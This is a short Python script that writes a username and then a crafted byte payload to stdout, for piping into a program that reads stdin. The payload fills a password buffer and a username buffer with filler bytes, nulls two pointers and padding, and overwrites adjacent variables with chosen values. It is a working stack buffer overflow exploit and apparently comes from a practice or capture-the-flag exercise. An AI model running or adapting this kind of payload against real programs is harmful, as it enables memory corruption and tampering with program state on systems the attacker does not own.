import sys

username = "user1"
username = bytes(username, "utf-8") + bytes([ord('\n')])

a,b,c = 'i','j','k'
NULL = 0x0# if junk is not null the buffer2 ptr will point to somewhere (outside of exe prob) and crash

# 16 for pw_buffer, 24 for un_buffer, 16 for the 2 global string literal ptrs, 5 padding, c,b,a.....
payload = [0x41]*16 + [0x42]*24 + [NULL]*16 + [NULL]*5 + [ord(c), ord(b)] + [ord(a)] + [ord('\n')]
payload = bytes(payload)

# Write bytes to stdout
sys.stdout.buffer.write(username)
sys.stdout.buffer.write(payload)

# python stdout_payload.py | program_reading_stdin.exe